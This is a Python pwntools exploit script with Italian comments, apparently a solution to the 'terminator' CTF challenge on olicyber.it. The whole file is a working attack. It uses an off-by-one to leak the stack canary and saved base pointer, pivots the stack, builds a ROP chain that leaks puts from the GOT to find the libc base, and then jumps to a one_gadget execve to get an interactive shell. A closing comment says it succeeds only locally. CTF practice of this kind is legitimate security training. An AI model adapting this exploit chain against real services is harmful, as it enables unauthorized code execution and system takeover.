from pwn import *

remo = True
if remo:
    el = ELF('terminator_nopatch')
else:
    el = ELF('terminator')

context.binary = el

libc = ELF('libc.so.6')

execve = [
    0xe6c7e,
    0xe6c81,
    0xe6c84
]
index = 1

# 77 - 56 overflow

offset = len('aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaa') + 1 #56
print(f'{offset=}')

# off by one sulla richiesta del nome
# smetterebbe di leggere allo 00 del canary ma lo sovrascrive con 10(a capo)
# così stampo il canary
if remo:
    p = remote('terminator.challs.olicyber.it' ,10307)
else:
    p = process('./terminator')
# patchelf --set-interpreter "$(pwd)/ld-linux-x86-64.so.2" --set-rpath $(pwd) ./terminator
# gli indico solo la cartella della libc, non il file
# input()
p.recvuntil(b'> ')

# no sendline, avrei due a capo
p.send(b'A' * offset)
p.recvline()
canary = p.recv(7)
# other memory leak, inutile
old_bp = p.recvuntil(b'Nice', drop=True).ljust(8, b'\x00')

# aggiungo 0 al canary
canary = b'\x00' + canary
print('canary: ' + canary.hex())

# soluzione, penso rop, trovo l'offset e chiamo il gadget
# https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address
# ma forse non ho spazio per fare la rop(17 bytes)
# e invece sì, ho leackato il base pointer, posso ritornare in cima(bp - 55) e uso il resto del payload per la rop
# forse ho detto una cavolata
# devo muovere il base pointer, posso forse sovrascrivere il vecchio base pointer con uno 
# che punta all'inizio della mia rop(o lì vicino).
# rop1   0x1
# rop2   0x2
# buff   0x3
# canary 0x4
# old_bp 0x5
# ret    0x6
#
# se qui metto l'old bp a 0x0, 0x1 è un return address
# devo mettere nel return address un gadget con solo ret 


PUTS_PLT = el.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = el.symbols['main'] # el.symbols['welcome'] + 0x9d per jumpare direttamente alla seconda puts
POP_RDI = 0x00000000004012fb
RET = 0x0000000000401016
POP_RBP = 0x0000000000401149

reference_func = 'puts'
FUNC_GOT = el.got[reference_func]


rop_str = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
# get address of puts
old_bp = u64(old_bp)
my_buff_addr = old_bp - 12 * 8
overwrite_bp = p64(my_buff_addr)

print(f'{len(rop_str)=}')
payload = flat({
    8: rop_str,
    offset: canary,
    offset + 8: overwrite_bp,
})
# dovrei aggiungere un pop rbp ma lo fa lui subito dopo il ret, quando torna in main

p.recvuntil(b'> ')
p.send(payload)
p.recvuntil(b'Goodbye!\n', drop=True)

# here return address is overwritten with puts address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, b"\x00"))

libc_func_address = libc.symbols[reference_func]
libc_base = leak - libc_func_address
if libc_base % pow(16,3) == 0:
    print('page offset aligned')
else:
    print('page offset not aligned')

print(f'libc base address: {hex(libc_base)}')

shell = libc_base + execve[index]
print(f'shell spawner address: {hex(shell)}')
shell = p64(shell)

# siamo di nuovo in welcome, forse al secondo read
p.recvuntil(b'> ')
p.send(b'A' * offset)
p.recvline()
p.recv(7)
# new base pointer memory leak
old_bp = p.recvuntil(b'Nice', drop=True).ljust(8, b'\x00')
old_bp = u64(old_bp)
my_buff_addr = old_bp - 12 * 8
print(f'New base pointer owerwrite: {hex(my_buff_addr)}')
overwrite_bp = p64(my_buff_addr)
print(p.recvuntil(b'> '))

payload = flat({
    8: shell,
    offset: canary,
    offset + 8: overwrite_bp,
})

p.send(payload)

p.interactive()
# funziona in locale ma non in remoto